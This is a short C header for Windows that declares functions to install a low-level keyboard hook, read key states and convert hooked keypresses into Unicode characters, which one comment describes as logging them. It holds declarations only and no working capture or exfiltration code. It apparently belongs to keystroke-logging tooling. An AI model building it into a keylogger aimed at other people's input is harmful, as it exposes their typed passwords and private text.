#pragma once

#include <stddef.h>
#include <Windows.h>

/* set_keyboard_hook - Sets the low level keyboard hook. */
BOOL set_keyboard_hook();

/*
 * get_keyboard_state - Copies the status of the 256 virtual keys to the
 * provided buffer.
 * @buff: The buffer to be filled with the keyboard state.
 * @size: The size of the buffer.
 */
void get_keyboard_state(BYTE* buff, size_t size);

/*
 * is_key_down - Returns whether the provided key is down.
 * @vk_code: The virtual-key code to verify.
 */
BOOL is_key_down(DWORD vk_code);

/*
 * kbd_to_unicode - Logs the respective characters of the provided KBD hook.
 * @kbd_hook: The kbd hook structure of the keypress.
 * @buff: The buffer to be filled with the respective unicode characters.
 * @size: The size of the buffer.
 *
 * Returns the number of characters written to the buffer.
 */
int kbd_to_unicode(const KBDLLHOOKSTRUCT* kbd_hook, LPWSTR buff, size_t size);
